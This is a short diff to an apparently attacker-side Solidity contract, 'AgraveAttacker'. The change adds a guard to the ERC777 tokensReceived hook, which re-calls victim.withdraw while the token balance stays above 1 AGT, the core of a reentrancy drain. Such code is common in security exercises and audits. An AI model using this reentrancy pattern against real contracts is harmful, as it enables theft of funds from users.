@@ -38,6 +38,9 @@ contract AgraveAttacker is IERC777Recipient {
         // may be a better expression in if statement,
         // this version may lead to REVERT;
         // 10 ** 18 in value == 1 AGT
+        if (from != address(victim)){
+            return;
+        }
         if (token.balanceOf(address(from)) > 10 ** 18) {
             victim.withdraw(address(this));
         }
